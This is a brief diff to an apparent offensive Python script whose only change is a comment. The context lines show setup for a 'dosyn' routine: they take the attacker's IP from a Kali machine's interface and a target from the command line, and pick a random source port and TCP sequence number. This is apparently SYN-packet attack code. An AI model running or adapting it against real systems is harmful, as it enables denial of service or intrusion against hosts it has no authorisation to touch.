@@ -7,7 +7,7 @@ def getInfo():
  getip = os.popen('ifconfig eth0 | grep "inet\ " | tr -s " " | cut -d" " -f3')
  ATTACKER=getip.read().strip("\n")
  s=ATTACKER # kali machine
- d=sys.argv[1] # OnGuard QPID
+ d=sys.argv[1] # QPID QPID
  sport=random.randint(30000,65535) # Random Port
  seq=random.randint(1000000000,4294967295) # Random Sequence
  def dosyn():
